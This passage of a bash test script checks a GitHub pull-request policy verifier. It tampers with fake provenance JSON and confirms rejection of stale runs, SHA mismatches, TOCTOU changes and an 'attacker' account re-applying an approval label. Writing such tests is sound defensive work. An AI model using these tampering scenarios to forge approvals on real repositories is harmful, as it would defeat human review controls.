expect_verify_red missing-status "latest 'Policy integrity gate' status is missing"

write_valid_provenance
jq 'del(.[0][0].sha)' "$STATE/statuses.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/statuses.json"
expect_verify_red status-without-exact-sha "is not a successful GitHub Actions status for the current head"

write_valid_provenance
jq '.run_attempt = 3' "$STATE/run.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/run.json"
expect_verify_red wrong-attempt 'does not match the exact trusted workflow/event/attempt/current head-base binding'

write_valid_provenance
jq '.[0].jobs[0].conclusion = "failure"' "$STATE/jobs.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/jobs.json"
expect_verify_red failed-job 'exact trusted evaluator job is missing, duplicated, or not successful'

write_valid_provenance
jq '.[0].total_count = 2' "$STATE/jobs.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/jobs.json"
expect_verify_red incomplete-jobs 'trusted workflow run-attempt jobs are unavailable'

write_valid_provenance
jq '.[0].total_count = 2 | .[0].jobs += [.[0].jobs[0]]' \
  "$STATE/jobs.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/jobs.json"
expect_verify_red duplicate-jobs 'trusted workflow run-attempt jobs are unavailable'

write_valid_provenance
printf '%s\n' '[[]]' >"$STATE/jobs.json"
expect_verify_red malformed-jobs 'trusted workflow run-attempt jobs are unavailable'

# REST head semantics are deliberately not guessed before live bootstrap. Both
# observed PR-head and event-authority shapes are accepted only when run,
# check-suite, and job remain internally identical.
write_valid_provenance
jq --arg sha "$AUTHORITY_SHA" '.head_sha = $sha | .head_branch = "main"' \
  "$STATE/run.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/run.json"
jq --arg sha "$AUTHORITY_SHA" '.head_sha = $sha' \
  "$STATE/suite.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/suite.json"
jq --arg sha "$AUTHORITY_SHA" '.[0].jobs[0].head_sha = $sha' \
  "$STATE/jobs.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/jobs.json"
run_verify >/dev/null || fail "internally bound event-authority REST head shape failed"

write_valid_provenance
jq --arg other "$OTHER_SHA" '.head_sha = $other' \
  "$STATE/suite.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/suite.json"
expect_verify_red mismatched-suite-head 'trusted workflow check suite GitHub Actions provenance is invalid'

write_valid_provenance
jq --arg other "$OTHER_SHA" '.[0].jobs[0].head_sha = $other' \
  "$STATE/jobs.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/jobs.json"
expect_verify_red mismatched-job-head 'exact trusted evaluator job is missing, duplicated, or not successful'

# A run from an old default-main workflow authority is stale even if every
# other status/run field remains genuine. A main advance requires a new event.
write_valid_provenance
jq --arg sha "$NEW_AUTHORITY_SHA" '.commit.sha = $sha' \
  "$STATE/authority.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/authority.json"
expect_verify_red old-main-authority-replay 'does not match the exact trusted workflow/event/attempt/current head-base binding'

write_valid_provenance
jq --arg sha "$NEW_AUTHORITY_SHA" '.commit.sha = $sha' \
  "$STATE/authority.json" >"$STATE/authority.after.json"
expect_verify_red authority-toctou 'default-branch authority moved during provenance verification'

# A historical success is insufficient. Merge-time verification re-evaluates
# the current protected paths, audit comment, and final label provenance.
write_valid_policy_provenance
jq '.[0][0].body = "audit marker deleted after the run" | .[0][0].updated_at = "2026-08-12T02:30:00Z"' \
  "$STATE/comments.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/comments.json"
expect_verify_red stale-success-comment-edit 'missing designated policy-owner audit comment for exact current head'

write_valid_policy_provenance
jq --argjson attacker "$ATTACKER_ID" '.[0] += [
  {id: 202, event: "unlabeled", actor: {login: "attacker", id: $attacker},
   label: {name: "policy-change-approved"}, created_at: "2026-08-12T02:30:00Z"},
  {id: 203, event: "labeled", actor: {login: "attacker", id: $attacker},
   label: {name: "policy-change-approved"}, created_at: "2026-08-12T02:30:01Z"}
]' "$STATE/events.json" >"$STATE/tmp.json"
mv "$STATE/tmp.json" "$STATE/events.json"
expect_verify_red stale-success-label-drift 'latest policy-change-approved transition was not applied by the same designated policy owner'

write_valid_policy_provenance
write_pr kwakseongjae 1 '[]'
expect_verify_red stale-success-current-label-removed 'required current label is missing'

write_valid_provenance
jq --arg head "$OTHER_SHA" '.head.sha = $head' "$STATE/pr.json" >"$STATE/pr.after.json"
expect_verify_red verify-head-toctou 'PR head does not match the trusted event head'

for api_failure in actions/workflows commits/ actions/runs check-suites; do
  write_valid_provenance
  printf '%s\n' "$api_failure" >"$STATE/fail_pattern"
  : >"$STATE/calls.log"; rm -f "$STATE/pr_reads" "$STATE/workflow_reads"
  if FAKE_POLICY_STATE="$STATE" MOMO_GH_BIN="$FAKE_GH" \
    "$VERIFY" --verify-run --repo example/oort --pr 42 \
      --expected-base track/engine --expected-base-sha "$BASE_SHA" \
      >"$SANDBOX/out" 2>&1; then
    fail "provenance API failure '$api_failure' passed"
  fi
done
rm -f "$STATE/fail_pattern"

echo "[policy-integrity-test] PASS candidate-free evaluation, approval TOCTOU, pagination, and exact run provenance"
